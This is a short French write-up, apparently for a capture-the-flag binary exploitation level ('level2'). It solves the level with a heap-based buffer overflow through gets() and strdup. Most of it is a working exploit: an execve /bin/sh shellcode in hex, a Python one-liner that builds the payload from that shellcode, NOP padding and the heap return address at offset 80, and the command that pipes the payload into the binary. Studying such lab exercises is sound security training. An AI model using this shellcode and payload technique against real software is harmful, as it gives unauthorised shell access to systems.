# level2

# après analyse du binaire avec gdb, on voit la fonction gets qui est vulnérable aux attaques buffer overflow

# mais on voit qu'il y a une protection sur l'adresse de retour de la pile a cause de la ligne +39 et +44, on va donc essayer de mettre un shellcode sur le tas grace a strdup qui fait un malloc

ltrace ./level2

# on récupere l'adresse de retour 0x0804a008 pour le strdup

# ensuite on recupere l'offset en lancant avec gdb puis en faisant un run avec un pattern (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) on trouve un offset de 80 avec l'adresse 0x37634136

# il nous faut maintenant un shell code a envoyer avec l'adresse de retour qui va être celle de strdup 0x0804a008

http://shell-storm.org/shellcode/files/shellcode-841.php
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

# ce qui va nous donné le shelle code, 80 - 21 = 59 x NOP et l'adresse de retour:

python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x90"*59 + "\x08\xa0\x04\x08"' > /tmp/level2

cat /tmp/level2 - | ./level2
